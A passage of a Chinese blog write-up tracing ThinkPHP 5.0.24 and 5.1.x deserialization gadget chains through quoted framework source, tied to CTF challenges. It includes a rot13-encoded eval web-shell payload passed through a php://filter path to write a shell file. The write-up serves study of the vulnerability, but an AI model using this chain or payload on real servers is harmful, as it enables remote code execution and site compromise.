class="keyword">function</span> <span class="title">toJson</span><span class="params">($options = JSON_UNESCAPED_UNICODE)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> json_encode(<span class="keyword">$this</span>-&gt;toArray(), $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时注意这里Model类是抽象类。所以实际编写exp时我们必须用它的子类。比如此处的Pivot。<br>我们直接来到toArray。这里首先主要看有没有可以触发<code>__call</code>的情况。5.0.24版本下应该又三处都是可以满足的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$relation = <span class="keyword">$this</span>-&gt;getAttr($key);</span><br><span class="line">$value = <span class="keyword">$this</span>-&gt;getRelationData($modelRelation);</span><br><span class="line">$item[$key] = $value ? $value-&gt;getAttr($attr) : <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><p>与其说是找触发<code>__call</code>的。不如说是找可用方法。多数情况下这些方法基本利用不了。但是如果满足<code>this-&gt;xxx($var)</code>或者进一步<code>可控类-&gt;xxx(可控变量)</code>。我们就能找任意类的<code>__call</code>进行进一步挖掘。这也是pop链中call方法经常用到的原因之一。</p><p>为了了解我们如何控制这一步用来调用<code>__call</code>。我们先放一下全局找<code>__call</code>的过程。来选择一个触发方式。<br>对于<code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code><br>这里看看<code>$value</code>与<code>$attr</code>依次是怎么被赋值的。<br><img src="/2020/08/05/Thinkphp-vuln/20.PNG" alt><br>value</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$relation = Loader::parseName($name, <span class="number">1</span>, <span class="keyword">false</span>);</span><br><span class="line">$modelRelation = <span class="keyword">$this</span>-&gt;$relation();</span><br><span class="line">$value         = <span class="keyword">$this</span>-&gt;getRelationData($modelRelation);</span><br></pre></td></tr></table></figure><p>主要是对<code>$name</code>调用parseName。而<code>$name</code>来自可控数组<code>$this-&gt;append</code>。<br><img src="/2020/08/05/Thinkphp-vuln/21.PNG" alt><br>也就是说。<code>$modelrelation</code>是Model这个类任意方法的返回值。(.<code>$relation()</code>)。所以找一个直接返回可控数据的方法即可。比如getError</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getError</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>回到上面。现在我们继续跟进getRelationData</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelationData</span><span class="params">(Relation $modelRelation)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class(<span class="keyword">$this</span>-&gt;parent)) &#123;</span><br><span class="line">        $value = <span class="keyword">$this</span>-&gt;parent;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 首先获取关联数据</span></span><br><span class="line">        <span class="keyword">if</span> (method_exists($modelRelation, <span class="string">'getRelation'</span>)) &#123;</span><br><span class="line">            $value = $modelRelation-&gt;getRelation();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> BadMethodCallException(<span class="string">'method not exists:'</span> . get_class($modelRelation) . <span class="string">'-&gt; getRelation'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先它接收的参数是<code>Relation</code>类的。所以我们上面返回的结果<code>$this-&gt;error</code>肯定也是一个<code>Relation</code>的对象了。（Relation也是抽象类。所以实例化时要用它的子类）<br>然后此处我们自然要走第一个if分支来控制返回值。分别看下<code>isSelfRelation()</code>跟<code>getModel()</code>发现都只是简单返回<code>this-&gt;relation</code>与<code>this-&gt;query-&gt;model()</code>。全部可控。<br>那只剩下让<code>get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)</code>成立了。<br>意思就是<code>$modelRelation-&gt;getModel()</code>和<code>$this-&gt;parent</code>为同类，也就是要求<code>$value-&gt;getAttr($attr)</code>中的<code>$value</code>和上面可控的model为同类<br>那么现在<code>$value-&gt;getAttr($attr)</code>的<code>value</code>跟完了。我们来看看<code>$attr</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$bindAttr = $modelRelation-&gt;getBindAttr();</span><br><span class="line"><span class="keyword">if</span> ($bindAttr) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($bindAttr <span class="keyword">as</span> $key =&gt; $attr)</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p>上面提到过，<code>modelRelation</code>因为取自可控方法所以是任意值。我们直接全局找<code>getBindAttr</code>方法。只有一个接口类:Relation的子类OnetoOne</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBindAttr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;bindAttr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数据可控。不过OnetoOne是抽象类。所以继续找子类。这里就只有两个子类。我们选择<code>HasOne</code>.</p><p>现在。我们做到了任意调用<code>__call</code>。剩下的就是找可用的<code>__call</code>。</p><p>那么全局找可用的<code>__call</code>。此处可以找到<br>think\console\Output 类。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (in_array($method, <span class="keyword">$this</span>-&gt;styles)) &#123;</span><br><span class="line">        array_unshift($args, $method);</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>, <span class="string">'block'</span>], $args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;handle &amp;&amp; method_exists(<span class="keyword">$this</span>-&gt;handle, $method)) &#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>-&gt;handle, $method], $args);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'method not exists:'</span> . <span class="keyword">__CLASS__</span> . <span class="string">'-&gt;'</span> . $method);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么首先上面触发点里<code>$this-&gt;parent</code>肯定是要传Output类的实例了。<br>下面看这里的<code>$this-&gt;block()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">block</span><span class="params">($style, $message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;writeln(<span class="string">"&lt;&#123;$style&#125;&gt;&#123;$message&#125;&lt;/$style&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeln</span><span class="params">($messages, $type = self::OUTPUT_NORMAL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;write($messages, <span class="keyword">true</span>, $type);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($messages, $newline = false, $type = self::OUTPUT_NORMAL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;handle-&gt;write($messages, $newline, $type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用的是<code>$this-&gt;handle-&gt;write</code>。既然<code>$this-&gt;handle</code>可控,那么此处找一个同名的<code>write</code>方法。我们全局搜索找到Memcached类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($sessID, $sessData)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;handler-&gt;set(<span class="keyword">$this</span>-&gt;config[<span class="string">'session_name'</span>] . $sessID, $sessData, <span class="keyword">$this</span>-&gt;config[<span class="string">'expire'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同理。还是可以全局找<code>set</code>方法。第一个就是我们曾经在tp5RCE中见到的File类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">'expire'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($expire <span class="keyword">instanceof</span> \DateTime) &#123;</span><br><span class="line">        $expire = $expire-&gt;getTimestamp() - time();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name, <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag &amp;&amp; !is_file($filename)) &#123;</span><br><span class="line">        $first = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $data = serialize($value);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">        <span class="comment">//数据压缩</span></span><br><span class="line">        $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $data   = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . <span class="string">"\n exit();?&gt;\n"</span> . $data;</span><br><span class="line">    $result = file_put_contents($filename, $data);</span><br><span class="line">    <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">        <span class="keyword">isset</span>($first) &amp;&amp; <span class="keyword">$this</span>-&gt;setTagItem($filename);</span><br><span class="line">        clearstatcache();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之前曾经说过rce时缓存文件名不可控。但是在反序列化中就不存在这个问题。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$filename = <span class="keyword">$this</span>-&gt;getCacheKey($name, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span><span class="params">($name, $auto = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $name = md5($name);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'cache_subdir'</span>]) &#123;</span><br><span class="line">        <span class="comment">// 使用子目录</span></span><br><span class="line">        $name = substr($name, <span class="number">0</span>, <span class="number">2</span>) . DS . substr($name, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>]) &#123;</span><br><span class="line">        $name = <span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>] . DS . $name;</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = <span class="keyword">$this</span>-&gt;options[<span class="string">'path'</span>] . $name . <span class="string">'.php'</span>;</span><br><span class="line">    $dir      = dirname($filename);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($auto &amp;&amp; !is_dir($dir)) &#123;</span><br><span class="line">        mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件名来自<code>$filename = $this-&gt;options[&#39;path&#39;] . $name . &#39;.php&#39;;</code>.可控。<br>我们再看文件内容如何控制。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data   = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . <span class="string">"\n exit();?&gt;\n"</span> . $data;</span><br></pre></td></tr></table></figure><p>这里就是pop链最大的难点了。<code>$data</code>其实并不可控。具体可以回溯到我刚刚上面放的一连串调用write方法的源码处。注意到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeln</span><span class="params">($messages, $type = self::OUTPUT_NORMAL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;write($messages, <span class="keyword">true</span>, $type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>write第二个参数是写死的<code>true</code>。它会一路传到File类作为<code>$data</code>写入。那么我们写文件等于控制不了写入内容。</p><p>但是没有关系。set在这个file_put_contents下还调用了一个函数setTagItem</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">setTagItem</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;tag) &#123;</span><br><span class="line">        $key       = <span class="string">'tag_'</span> . md5(<span class="keyword">$this</span>-&gt;tag);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tag = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;has($key)) &#123;</span><br><span class="line">            $value   = explode(<span class="string">','</span>, <span class="keyword">$this</span>-&gt;get($key));</span><br><span class="line">            $value[] = $name;</span><br><span class="line">            $value   = implode(<span class="string">','</span>, array_unique($value));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = $name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;set($key, $value, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里我们又一次调用了<code>set</code>。并且两个参数全部可控。所以最后循环调用我们就知道,写入文件的文件名为<code>md5(&#39;tag_&#39; . md5($this-&gt;tag)).&#39;.php&#39;</code>。内容为<code>$data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;</code></p><p>当然。这里显然存在一个绕过死亡exit的问题。使用rot13即可。然后rot13的payload绕不过默认的短标签。所以会需要加过滤器组合拳。除了常见的base64，WMCTF中使用到其他的<code>iconv</code>或者其他组合也是可行的。<br>原理不再赘述<br>那么。控制payload只要控制File类<code>$this-&gt;options[&#39;path&#39;] = php://filter/write=string.rot13/resource=&lt;?cuc @riny($_TRG[_]);?&gt;</code>即可。</p><p>执行exp打的话。会发现存在两个文件。这是上面我们调用了两次<code>set</code>的缘故。而文件名由我们的<code>$tag</code>决定。具体计算方法也在上面提及了。当然最好的方法永远是本地自己打一遍。这样才能确信文件名这种远程不可见的东西。</p><p>另外我相信大家肯定发现这个pop链有个变招。那就是linux,windows通用的写目录。回到上面getCacheKey</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$dir = dirname($filename);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($auto &amp;&amp; !is_dir($dir)) &#123;</span><br><span class="line">mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要把<code>$this-&gt;options[&#39;path&#39;]</code>设置为目录的话。直接可以写755权限目录。</p><p>SCTF2020 考察tp5.024那道题当时使用了python脚本高强度删文件。导致我以为当前目录不可写。但是换成写目录的payload后发现可以创建目录。并且可以存在相同于靶机重启时间的3分钟。所以使用这种payload黑盒探测不失为一种办法。</p><h2 id="tp5-1-x-unserialize"><a href="#tp5-1-x-unserialize" class="headerlink" title="tp5.1.x-unserialize"></a>tp5.1.x-unserialize</h2><p>今天来跟下5.1的pop链。相比5.0而言思路大致相同。只有几个类的区别。并且其exp已经集成到phpggc上了。</p><p>还是从起点开始看。跟昨天5.0的链子是一样的。从Windows类开始。然后=&gt;file_exists =&gt; <strong>toString()。然后接着全局搜索。此处利用Conversion的</strong>toString() =&gt; __toJson() =&gt; toArray()<br>而不是5.0中的Model类</p><p>看到thinkphp\library\think\model\concern\Conversion.php<br>中的<code>toArray()</code> .我们同样寻找可以触发<code>__call()</code>的代码</p><p><img src="/2020/08/05/Thinkphp-vuln/22.PNG" alt></p><p>此处主要是<code>$relation-&gt;visible($name)</code>会触发<code>__call</code>.选择这一处的代码是因为,relation来自<code>$this-&gt;getRelation($key)</code>.<code>$name</code>来自<code>$this-&gt;append</code>.<br>看到getRelation</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们要进入<code>visble</code>的分支。必须要<code>$relation</code>为空。所以<code>$this-&gt;relation</code>直接置空即可。</p><p>此时<code>$relation</code>由<code>$relation = $this-&gt;getAttr($key);</code>决定。它会依次调用\thinkphp\library\think\model\concern\Attribute.php 的getAttr()与getData()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getAttr</span><span class="params">($name, &amp;$item = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $notFound = <span class="keyword">false</span>;</span><br><span class="line">        $value    = <span class="keyword">$this</span>-&gt;getData($name);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvalidArgumentException $e) &#123;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">($name = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null($name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$name];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (array_key_exists($name, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> InvalidArgumentException(<span class="string">'property not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就能确认我们的<code>$relation</code>来自Attribute类的<code>$this-&gt;data[$name]</code>.</p><p>现在需要注意的是。我们必须得找到一个既能调用Conversion还能调用Attribute属性的类。即继承了Attribute类和Conversion类的子类。这个其实就是我们之前5.0链子中用过的Model.php。<br>加上Model是抽象类。所以编写exp中使用它的子类Pivot实例化。这点不必多说。</p><p>接下来看<code>$relation-&gt;visible($name)</code>中的<code>$name</code>.它是遍历<code>$this-&gt;append</code>得到的。可控。只需注意将其赋值为数组即可。(因为要进入<code>if (is_array($name))</code>的分支)</p><p>既然已经拥有触发<code>__call</code>的条件了。我们现在找一个可用的<code>__call</code>。5.1版本中的gadget就是来自Request类的<code>__call</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($method, <span class="keyword">$this</span>-&gt;hook)) &#123;</span><br><span class="line">        array_unshift($args, <span class="keyword">$this</span>);</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;hook[$method], $args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'method not exists:'</span> . <span class="keyword">static</span>::class . <span class="string">'-&gt;'</span> . $method);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然<code>$this-&gt;hook</code>可以让我们控制为<code>[&quot;visable&quot;-&gt;&quot;arbitrary method&quot;]</code>这个数组任意调用方法。但是注意<code>array_unshift($args, $this)</code>会强行把<code>$this</code>放到<code>$args</code>数组的第一位。其后果是怎样的呢？我们看下<code>call_user_func_array</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array([$obj,<span class="string">"arbitrary method"</span>],[<span class="keyword">$this</span>,$arg])</span><br><span class="line">=&gt;</span><br><span class="line">$obj-&gt;$func(<span class="keyword">$this</span>,$argv)</span><br></pre></td></tr></table></figure><p>这种方法执行几乎没有。所以这就限制我们要找一个不受这种调用方式影响的函数。</p><p>在以前tp5的漏洞分析中,曾经用到过<code>think\Request</code>类中的input 方法。里面有<code>call_user_func($filter,$data)</code>可以用于命令执行。<br>但是前面说过， <code>$args</code> 数组变量的第一个元素，是一个固定死的类对象，所以这里我们不能直接调用 input 方法，而应该寻找调用 input 的方法。</p><p>整个Request类中一共有7处调用input方法的其他方法。我们选择<code>param</code>方法为例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">param</span><span class="params">($name = <span class="string">''</span>, $default = null, $filter = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;mergeParam) &#123;</span><br><span class="line">        $method = <span class="keyword">$this</span>-&gt;method(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 自动获取请求变量</span></span><br><span class="line">        <span class="keyword">switch</span> ($method) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'POST'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;post(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PUT'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'DELETE'</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'PATCH'</span>:</span><br><span class="line">                $vars = <span class="keyword">$this</span>-&gt;put(<span class="keyword">false</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                $vars = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当前请求参数和URL地址中的参数合并</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;param, <span class="keyword">$this</span>-&gt;get(<span 